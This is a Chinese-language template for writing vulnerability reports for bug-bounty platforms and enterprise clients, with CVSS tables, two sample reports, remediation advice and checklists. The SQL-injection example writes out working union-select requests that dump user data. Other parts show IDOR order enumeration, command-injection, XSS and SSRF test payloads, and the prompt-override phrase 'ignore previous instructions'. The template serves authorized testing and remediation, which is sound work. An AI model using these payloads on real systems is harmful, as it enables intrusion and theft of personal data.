# 漏洞报告模板 (SRC / 赏金 / 企业甲方三用)

> 相比原版新增: CVSS 向量 / 三段式修复建议 / False Positive 检查 / OWASP 完整编号 / 企业执行摘要版本。

---

## 目录
- [1. 报告结构概览](#1-报告结构概览)
- [2. 漏洞等级与评分](#2-漏洞等级与评分)
- [3. 标准漏洞条目模板 (通用)](#3-标准漏洞条目模板-通用)
- [4. 完整赏金报告示例](#4-完整赏金报告示例)
- [5. 企业甲方报告模板](#5-企业甲方报告模板)
- [6. 修复建议三段式](#6-修复建议三段式)
- [7. False Positive 自检清单](#7-false-positive-自检清单)
- [8. 质量检查清单](#8-质量检查清单)

---

## 1. 报告结构概览

### 1.1 SRC / 赏金平台必需

```
1. 漏洞标题            (一句话概括漏洞+影响)
2. 漏洞等级 + CVSS     (严重/高/中/低 + CVSS 3.1 向量)
3. 漏洞类型 + 标准编号 (SQLi/XSS/... + WSTG + CWE)
4. 受影响资产
5. 接口发掘路径        (必填: 这个接口是怎么发现的)
6. 详细复现步骤         (每步含完整 BP 格式请求包,不是单行 curl)
7. 利用链打法           (级联漏洞必填: 每步请求包+衔接逻辑)
8. 影响证明             (实际危害,不只是 PoC)
9. False Positive 排除  (为什么不是误报)
10. 修复建议            (三段式: 短期/长期/验证)
11. 附件               (截图/录屏/Burp 流量)
```

### 1.2 企业甲方报告必需

```
额外要求:
- 执行摘要 (面向管理层, 3 段以内)
- 漏洞全景图 (饼图/热力图: 严重度分布)
- 攻击路径图 (多漏洞组合)
- 修复优先级 + 时间预估
- 重测验证计划
```

---

## 2. 漏洞等级与评分

### 2.1 CVSS v3.1 向量

标准格式: `AV:?/AC:?/PR:?/UI:?/S:?/C:?/I:?/A:?`

| 指标 | 值 | 含义 |
|------|-----|------|
| AV (Attack Vector) | N/A/L/P | 网络/邻近/本地/物理 |
| AC (Attack Complexity) | L/H | 低/高 |
| PR (Privileges Required) | N/L/H | 无/低/高 |
| UI (User Interaction) | N/R | 无/需 |
| S (Scope) | U/C | 不变/改变 |
| C (Confidentiality) | H/L/N | 高/低/无 |
| I (Integrity) | H/L/N | — |
| A (Availability) | H/L/N | — |

### 2.2 典型漏洞 CVSS 对照

| 漏洞 | CVSS 向量 | 分数 | 等级 |
|------|----------|------|------|
| 未授权 RCE | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H | 9.8 | 严重 |
| SQL 注入(读写全库) | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N | 9.1 | 严重 |
| SQL 注入(仅读) | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N | 7.5 | 高 |
| 账号接管 (无交互) | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N | 9.1 | 严重 |
| SSRF (内网+AK泄露) | AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N | 9.3 | 严重 |
| SSRF (仅内网探测) | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N | 7.2 | 高 |
| 任意文件读取 | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N | 7.5 | 高 |
| 文件上传 (WebShell) | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H | 8.8 | 高 |
| 水平越权 (IDOR/BOLA) | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N | 8.1 | 高 |
| 垂直越权 (BFLA) | AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N | 9.9 | 严重 |
| 存储型 XSS (管理员触发) | AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N | 8.7 | 高 |
| 反射型 XSS | AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N | 6.1 | 中 |
| DOM XSS | AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N | 5.4 | 中 |
| CSRF (关键操作) | AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:H/A:N | 6.5 | 中 |
| Clickjacking (账号删除) | AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H | 6.5 | 中 |
| 条件竞争 (财务损失) | AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N | 5.3 | 中 |
| 原型污染 → RCE | AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H | 8.1 | 高 |
| HTTP 请求走私 | AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N | 9.0 | 严重 |
| 子域名接管 (静态) | AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N | 6.1 | 中 |
| 子域名接管 (共享 Cookie) | AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N | 9.0 | 严重 |
| 反序列化 RCE | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H | 9.8 | 严重 |
| JWT 算法混淆 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N | 9.1 | 严重 |
| Prompt 注入 (数据泄露) | AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N | 7.5 | 高 |
| Agent 工具滥用 | AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N | 9.6 | 严重 |
| 弱密码策略 | AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N | 3.7 | 低 |
| 缺少安全头 | AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N | 3.1 | 低 |

### 2.3 SRC 平台对照

| 平台 | 严重 | 高 | 中 | 低 | 典型奖励(人民币) |
|------|------|-----|-----|-----|-----------------|
| 补天 | RCE / 批量数据 | SQL 注入 / 任意文件 | XSS / 越权 | 信息泄露 | 低 500+ / 严重 5 万+ |
| 漏洞盒子 | 核心数据泄露 | 敏感数据 | 一般数据 | 配置问题 | 类似 |
| 通用 SRC | 账号接管 / 支付 | 大量数据 | 少量数据 | 其他 | 视业务价值 |
| HackerOne | Critical | High | Medium | Low | $500-$50000+ |
| Bugcrowd | P1 | P2 | P3 | P4/P5 | 类似 H1 |

---

## 3. 标准漏洞条目模板 (通用)

```markdown
## VULN-XXX: (漏洞一句话标题)

| 属性 | 详情 |
|------|------|
| 等级 | 严重 / 高危 / 中危 / 低危 |
| CVSS 分数 | 9.1 |
| CVSS 向量 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N |
| 漏洞类型 | SQL 注入 (Union-Based) |
| OWASP WSTG | WSTG-INPV-05 |
| CWE | CWE-89 |
| OWASP Top 10 | A03:2021 Injection |
| 受影响资产 | https://target.com/api/v1/search |
| 参数 | keyword (GET) |
| 攻击者前提 | 无(未授权可利用) |
| 状态 | 已确认 / 已复现 3 次 |
| 报告日期 | 2026-04-18 |

### 漏洞描述

(2-3 段, 客观描述漏洞本质, 不加营销语言)

### 接口发掘路径

(必填) 说明这个接口是怎么发现的, 例: "Phase 1 JS 分析 /app.js 暴露路径 /api/v1/search" 或 "Phase 2 对 /api/v1/user 参数 fuzz 时发现 keyword 参数异常"

### 复现步骤

**Step 1**: (操作)
**HTTP 请求**:
```http
GET /api/v1/search?keyword=test HTTP/1.1
Host: target.com
Cookie: session=...
...
```

**HTTP 响应**:
```json
{"code":0,"data":[{...}]}
```

**Step 2**: ...
(每步必须包含完整 BP 格式请求包: 请求行 + 全部 Header + Cookie + Body, 不是单行 curl)

### 利用链打法

(级联漏洞必填, 单漏洞可略) 每步如何衔接:
- Step 1 → Step 2: (衔接逻辑)
- 每步的完整请求包 + 响应摘要

### 影响证明

1. (具体证据 1, 含截图引用)
2. (具体证据 2)
3. (影响范围量化: 影响用户数 / 数据量)

### False Positive 排除

- [x] 复现 3 次均稳定触发, 非网络抖动
- [x] 使用不同 IP / 账号均可复现
- [x] 排除浏览器缓存 / autofill 干扰
- [x] 排除自身账号特权 (用普通账号复现)

### 修复建议

**短期缓解 (1 周内)**:
- (临时措施, 如 WAF 规则)

**长期修复 (1 月内)**:
- (根本修复, 如参数化查询)

**修复验证**:
- (如何确认修复有效, 给测试 payload)

### 附件

- screenshot-1.png (漏洞触发)
- screenshot-2.png (数据泄露证明)
- burp-request.txt (原始请求)
- exploit.py (复现脚本, 仅此报告内提供)
```

---

## 4. 完整赏金报告示例

### 示例 1: SQL 注入(严重)

```markdown
## VULN-001: 某系统用户搜索接口 SQL 注入可获取全量用户信息

| 属性 | 详情 |
|------|------|
| 等级 | 严重 |
| CVSS 分数 | 9.1 |
| CVSS 向量 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N |
| 漏洞类型 | SQL 注入 (Union-Based, MySQL) |
| OWASP WSTG | WSTG-INPV-05 |
| CWE | CWE-89 |
| OWASP Top 10 | A03:2021 Injection |
| 受影响资产 | https://target.com/api/user/search |
| 参数 | keyword (GET) |
| 攻击者前提 | 无(未授权可利用) |
| 状态 | 已确认, 复现 3 次 |

### 漏洞描述

目标系统用户搜索接口的 `keyword` 参数未对用户输入做过滤或参数化,直接拼入 SQL 查询语句。
攻击者可通过 Union 注入读取数据库任意表数据, 获取用户名、手机号、邮箱、密码哈希等敏感信息。

### 接口发掘路径

Phase 1 目录枚举发现 `/api/` 路径 → JS 文件 `/static/js/app.js` 中暴露 `/api/user/search?keyword=` 接口 → Phase 2 对该参数 fuzz 时输入单引号触发 500 错误。

### 复现步骤

**Step 1**: 正常请求确认参数回显
```http
GET /api/user/search?keyword=test HTTP/1.1
Host: target.com
Accept: application/json
User-Agent: Mozilla/5.0
```
→ 200, `{"code":0,"data":[{"username":"test_user",...}]}`

**Step 2**: 注入单引号确认 SQL 错误
```http
GET /api/user/search?keyword=test' HTTP/1.1
Host: target.com
Accept: application/json
User-Agent: Mozilla/5.0
```
→ 500, `"SQL syntax error near 'test''"`

**Step 3**: ORDER BY 确认列数 (5 列)
```http
GET /api/user/search?keyword=test'+order+by+5--+- HTTP/1.1
Host: target.com
Accept: application/json
```
→ 200 (正常)
```http
GET /api/user/search?keyword=test'+order+by+6--+- HTTP/1.1
Host: target.com
Accept: application/json
```
→ 500 (报错, 确认 5 列)

**Step 4**: Union 读取数据库表名
```http
GET /api/user/search?keyword=test'+union+select+1,group_concat(table_name),3,4,5+from+information_schema.tables+where+table_schema=database()--+- HTTP/1.1
Host: target.com
Accept: application/json
```
→ 200, 响应中包含所有表名: users, orders, payments, ...

**Step 5**: 提取用户数据 (100 条样本)
```http
GET /api/user/search?keyword=test'+union+select+1,group_concat(username,0x7c,phone,0x7c,email),3,4,5+from+users+limit+0,100--+- HTTP/1.1
Host: target.com
Accept: application/json
```
→ 200, 返回 100 条用户数据

### 影响证明

1. 读取到 100 条用户完整数据 (截图 1)
2. `information_schema.tables` 显示 users 表共 1,245,678 条记录
3. 泄露字段: username / phone / email / password_hash (bcrypt) / id_card_last4
4. 预估全量影响: 124 万+ 用户 PII 数据

### False Positive 排除

- [x] 用 curl / Burp / 浏览器三种客户端复现, 均稳定触发
- [x] SLEEP(5) 稳定延迟 5 秒(3 次测试), 排除网络抖动
- [x] 不同 IP / 不同浏览器 session 均可复现
- [x] 无需登录 (从注销状态触发)

### 修复建议

**短期缓解 (1 周内)**:
- 部署 WAF 规则拦截 `union select` / `information_schema` / `sleep(` 等特征
- 对 `keyword` 参数做白名单(允许字母/数字/空格, 长度 ≤ 50)
- 立即强制所有用户下次登录重置密码

**长期修复 (1 月内)**:
- 重构 DAO 层, 全部使用参数化查询(PreparedStatement):
  ```java
  String sql = "SELECT * FROM users WHERE username LIKE ?";
  PreparedStatement stmt = conn.prepareStatement(sql);
  stmt.setString(1, "%" + keyword + "%");
  ```
- 数据库应用最小权限: 业务账号移除 FILE / SUPER / PROCESS 权限
- 添加 Query 长度/复杂度限制
- 启用 DB 审计日志

**修复验证**:
- 复测 Payload: `test' union select 1,2,3,4,5-- -`, 预期响应应为 200 并把 `'` 视为普通字符
- 复测: `test' AND SLEEP(5)-- -`, 响应应 < 1s
- 手工审计代码, 确认所有 SQL 拼接点已替换为 PreparedStatement

### 附件

- screenshot-1.png: 漏洞触发后的 JSON 响应 (100 条用户数据)
- screenshot-2.png: `COUNT(*)` 查询结果 (1,245,678)
- burp-request.txt: 完整 HTTP 请求
```

### 示例 2: 水平越权 (高)

```markdown
## VULN-002: 订单详情接口水平越权可查看任意用户订单

| 属性 | 详情 |
|------|------|
| 等级 | 高 |
| CVSS 分数 | 8.1 |
| CVSS 向量 | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N |
| 漏洞类型 | 水平越权 (IDOR / BOLA) |
| OWASP WSTG | WSTG-ATHZ-04 |
| CWE | CWE-639 |
| OWASP API Top 10 | API1:2023 BOLA |

### 漏洞描述

`/api/v1/order/detail` 接口仅通过 orderId 查询, 未校验当前登录用户是否为订单所属用户。
攻击者可通过遍历 orderId 获取任意用户的订单详情。

### 接口发掘路径

Phase 1 子域名枚举发现 m.target.com → Burp 抓包移动端 APP 流量,发现 `/api/v1/order/detail?orderId=` 接口 → Phase 2 按 registerable-site-protocol 注册两账号后测试越权。

### 复现步骤

**Step 1**: 账号 A 登录, 查自己订单
```http
GET /api/v1/order/detail?orderId=ORD10001 HTTP/1.1
Host: target.com
Cookie: session=SESSION_A
Accept: application/json
User-Agent: Mozilla/5.0
```
→ 200, `{"orderId":"ORD10001","userId":1001,"receiverName":"张三",...}`

**Step 2**: 保留 A 的 session, 访问账号 B 的订单
```http
GET /api/v1/order/detail?orderId=ORD20001 HTTP/1.1
Host: target.com
Cookie: session=SESSION_A
Accept: application/json
User-Agent: Mozilla/5.0
```
→ 200, 返回 B 的订单数据: `{"orderId":"ORD20001","userId":2001,"receiverName":"李四","phone":"138****5678","address":"...","items":[...],"totalAmount":299.00}`

**Step 3**: 遍历 ORD10001-ORD50000, 成功获取 38,000+ 订单
```http
GET /api/v1/order/detail?orderId=ORD10002 HTTP/1.1
Host: target.com
Cookie: session=SESSION_A
Accept: application/json
```
→ 200, `{"orderId":"ORD10002","userId":1002,...}` (另一个用户的订单)

### 利用链打法

- Step 1 (本漏洞): BOLA 遍历订单 → 获取大量收货人手机号/地址
- Step 2 (级联): 用泄露手机号 → 密码重置接口无验证码 → 账号接管 (VULN-003)
- Step 3 (级联): 被接管账号含管理员 → 后台文件上传 → WebShell (VULN-004)
- 实际影响: BOLA 单独可批量泄露 38,000+ 用户订单; 级联可接管管理员账号

### 影响证明

1. 截图 A session 读到 B 的订单(不同 userId)
2. 脚本遍历获取 38,000 条订单样本
3. 泄露字段: receiverName / phone / address / items / totalAmount

### False Positive 排除

- [x] A / B 账号分属不同用户 ID (1001 vs 2001), 非同一账号
- [x] 复现使用新浏览器, 无 cache 干扰

### 修复建议

**短期**: 在 OrderController 增加 owner 检查:
```java
if (!order.getUserId().equals(currentUser.getId())) {
    throw new ForbiddenException();
}
```

**长期**:
- ORM 层统一加 row-level authorization filter
- orderId 使用 UUID / Snowflake 替代递增 int, 降低遍历可行性
- 添加速率限制, `/api/v1/order/detail` 每账号每分钟 30 次

**验证**: 复测账号 A 访问 B 的订单应返回 403。

### 附件
- order_A.png / order_B.png / sweep_script.py / burp-stream.txt
```

---

## 5. 企业甲方报告模板

### 5.1 执行摘要 (面向管理层)

```markdown
# 企业 X 安全评估报告 - 执行摘要

## 评估概况
- 评估范围: example.com 主站 + 4 个子域 + 移动端 Android App
- 评估时间: 2026-04-01 至 2026-04-15
- 评估方法: 黑盒渗透测试(授权范围内)

## 关键发现
发现 **17 个漏洞**, 其中:
- 严重 (Critical): 2 个
- 高危 (High):     5 个
- 中危 (Medium):   7 个
- 低危 (Low):      3 个

## 最关键风险
1. **主站 SQL 注入** (CVSS 9.1) — 可能导致 124 万用户数据泄露
2. **支付接口金额可篡改** (CVSS 8.8) — 直接财务损失

## 建议行动
- 立即修复 2 个严重漏洞 (72 小时内)
- 30 天内修复全部高危漏洞
- 实施 WAF 与代码审计流程改进

## 详细报告
- 技术细节: 请参阅第 6 章及附录 A
- 修复优先级: 请参阅第 7 章
```

### 5.2 漏洞全景图

```
严重度分布:
严重 ████ 2
高危 ██████████ 5
中危 ██████████████ 7
低危 ██████ 3

漏洞类型分布:
注入类     ██████ 4
授权类     ████████ 5
配置类     ██████ 3
业务逻辑   ████ 2
其他       ████ 3
```

### 5.3 攻击路径图

```
账号接管链 (严重):
  SQL 注入 [VULN-001]
     │
     ▼
  获取密码哈希
     │
     ▼
  离线破解弱密码
     │
     ▼
  登录管理员账号
     │
     ▼
  滥用管理 API [VULN-004]
     │
     ▼
  全量数据导出
```

### 5.4 修复优先级

| 优先级 | 漏洞 | 建议修复时限 | 工作量 |
|-------|------|-------------|-------|
| P0 | VULN-001 SQL 注入 | 72 小时 | 2 人日 |
| P0 | VULN-003 支付逻辑 | 72 小时 | 3 人日 |
| P1 | VULN-002 BOLA | 14 天 | 5 人日 |
| P1 | VULN-004 越权 | 14 天 | 3 人日 |
| P2 | 中危漏洞 (7 个) | 30 天 | 10 人日 |
| P3 | 低危漏洞 (3 个) | 60 天 | 2 人日 |

### 5.5 重测验证计划

- 修复完成后 7 天内, 执行每个漏洞的 "修复验证" 步骤
- 重测通过方可关闭漏洞单
- 重测不通过 → 退回开发 → 循环

---

## 6. 修复建议三段式

> 每个漏洞必须给出 **短期 / 长期 / 验证** 三段建议。

### 6.1 SQL 注入

- **短期**: 参数白名单; WAF 规则 (union select / information_schema / xp_cmdshell); 数据库账号去除危险权限
- **长期**: ORM/参数化查询; 代码审计覆盖所有 SQL sink; SAST 工具集成 CI
- **验证**: 复测原始 payload 应为 200 并视 `'` 为普通字符; `SLEEP(5)` 延迟应 < 1s

### 6.2 XSS

- **短期**: 对输出做 HTML/JS 上下文专用转义; CSP `default-src 'self'`
- **长期**: 模板引擎启用自动转义; 富文本用 DOMPurify 白名单
- **验证**: `<img src=x onerror=alert(1)>` 应被完全转义

### 6.3 命令注入

- **短期**: 参数白名单 (`[a-zA-Z0-9.-]`); 禁用危险字符
- **长期**: 用语言原生 API (如 Java `ProcessBuilder` 分离 command / args) 而非 shell; 代码审计
- **验证**: `;id` / `$(id)` 等 payload 无反应, 且无 OOB DNS 请求

### 6.4 SSRF

- **短期**: 白名单目标域; 禁止访问 169.254.x.x / 127.x / 10.x / 192.168.x; 禁止非 http/https 协议
- **长期**: 独立出站代理层, 所有出站流量统一过滤
- **验证**: `http://127.0.0.1` / `http://169.254.169.254` 被拒绝

### 6.5 文件上传

- **短期**: 白名单扩展名 + MIME 双验证; 上传目录禁执行(Apache/Nginx 配置)
- **长期**: 文件名用 UUID; 上传服务单独部署(与应用服务器隔离)
- **验证**: `.php` / `.phtml` / `.asp;.jpg` 均不能上传或上传后不可执行

### 6.6 越权 (IDOR/BOLA)

- **短期**: 每个接口增加 `owner == currentUser` 检查
- **长期**: ORM 层统一 row-level filter(如 Django RLS, Rails CanCanCan); 使用 UUID 代替递增 ID
- **验证**: 交叉账号测试应返回 403

### 6.7 认证类

- **短期**: 强制密码复杂度; 锁定 5 次失败账户 30 分钟; 验证码
- **长期**: MFA 强制; 密码哈希 bcrypt/scrypt; OAuth+PKCE
- **验证**: 弱密码 `123456` 被拒绝; 失败 5 次触发锁定

### 6.8 CSRF

- **短期**: 关键操作强制 CSRF Token; `SameSite=Strict` Cookie
- **长期**: 敏感操作加二次确认(密码或验证码)
- **验证**: 移除 CSRF Token 应 403

### 6.9 Prompt 注入

- **短期**: 输入/输出双层过滤; 关键指令加强化 system prompt
- **长期**: Agent 工具权限最小化; 人工审批循环; 输出 sanitize
- **验证**: 核心注入 payload(如 "ignore previous instructions") 被拒绝或不改变行为

---

## 7. False Positive 自检清单

报告前每个漏洞必须过:

### 7.1 通用
- [ ] 至少复现 3 次
- [ ] 排除网络/缓存/浏览器 autofill 干扰
- [ ] 不同 IP / 不同账号 / 不同设备验证
- [ ] 排除自身账号特权导致的"伪漏洞"
- [ ] 无其他合理解释

### 7.2 SQLi
- [ ] 非显错: 用 SLEEP / Boolean 二次确认
- [ ] 显错: 确认错误来自 DB 而非 WAF
- [ ] UNION: 确认列数对应并有回显

### 7.3 XSS
- [ ] alert / prompt 实际弹窗
- [ ] 非浏览器自带过滤器拦截(看 Console)
- [ ] 非返回 JSON 意外被渲染

### 7.4 SSRF
- [ ] 有 OOB 请求(DNS / HTTP) 才算确认
- [ ] 127.0.0.1 访问与非 SSRF 的普通 404 区分

### 7.5 越权
- [ ] 两个完全独立账号
- [ ] 返回数据确实属于对方(看 userId)

### 7.6 Race
- [ ] 业务结果真实变化(比如余额/券数)
- [ ] 多次复现命中率稳定

### 7.7 RCE
- [ ] 确实执行命令(`id` / `whoami` 输出)
- [ ] OOB DNS 请求到达

### 7.8 AI 相关
- [ ] 输出非 hallucination, 是真的被注入
- [ ] System Prompt 内容与"常见模型默认输出"区别

---

## 8. 质量检查清单

### 8.1 报告完整性
- [ ] 每个漏洞有接口发掘路径 (怎么发现这个接口的)
- [ ] 每个漏洞有 CVSS 向量字符串
- [ ] 每个漏洞有 OWASP / CWE 编号
- [ ] 每个漏洞有复现步骤(含完整 BP 格式请求包,不是单行 curl)
- [ ] 级联漏洞有利用链打法(每步请求包+如何衔接)
- [ ] 每个漏洞有影响证明(截图/数据量)
- [ ] 每个漏洞有修复建议(三段式)
- [ ] 每个漏洞有 False Positive 排除
- [ ] 执行摘要适合非技术人员
- [ ] 敏感数据已脱敏

### 8.2 格式
- [ ] 无拼写/语法错误
- [ ] 截图清晰可辨, 关键信息高亮
- [ ] 所有 URL 可点击
- [ ] 代码块有语言标记

### 8.3 合规
- [ ] 授权范围描述清楚
- [ ] 测试时间窗口
- [ ] 仅展示证明影响所需的最小数据
- [ ] 非核心 PII 已模糊处理
- [ ] 报告标注 "仅供授权使用"

---

## 9. 附录: 报告撰写常见陷阱

| 陷阱 | 正确做法 |
|------|---------|
| "可能可以利用" | 给出 PoC / 或降级为"信息" |
| "导致严重后果" | 量化: 多少用户 / 多少数据 |
| 只给 curl 命令 | 附完整 HTTP 请求文件 |
| 只给截图没给请求 | 两者都给 |
| "请修复" | 给三段式建议 |
| 把 PoC 当作影响 | 分清 PoC 和实际影响 |
| 拼接多个漏洞为"1个" | 独立漏洞独立报告, 再补一个"组合链"说明 |
| 自评 Critical 但 CVSS 只有 5.3 | 自评与 CVSS 保持一致 |

---

*版本: v1.0 | 适配 WSTG v4.2 / CVSS v3.1 / OWASP Top 10 2021 / API Top 10 2023 / LLM Top 10 2025 / ASI Top 10 2026*
